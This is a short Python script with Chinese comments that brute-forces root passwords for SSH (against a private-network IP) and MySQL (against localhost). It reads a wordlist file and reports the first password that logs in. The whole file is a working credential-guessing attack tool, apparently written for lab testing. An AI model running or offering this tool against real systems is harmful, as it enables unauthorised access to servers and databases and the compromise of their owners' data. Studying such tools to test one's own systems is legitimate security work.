import pymysql,paramiko
'''
这是一个爆破测试文件（ssh和mysql）
'''

'''
这是爆破ssh
'''
def baopossh():
    with open("zidianlujing","r") as f:
        passwd=f.readlines()
    for i in passwd:
        try:
            tran=paramiko.Transport(('192.168.161.131',22))
            tran.connect(username='root',password=i.strip('\n'))
            print(f"爆破成功,密码是{i.strip()}")
            return
        except:
            pass

'''
这是爆破mysql
'''
def baopomysql():
    with open("zidianlujing", "r") as f:
        passwd = f.readlines()
    for i in passwd:
        try:
            conn=pymysql.connect(host='localhost',port=3306,user='root',passwd=i.strip('\n'))
            print(f"爆破成功,密码是{i.strip()}")
            return
        except:
            pass

if __name__ == '__main__':
    #baopossh()
    baopomysql()
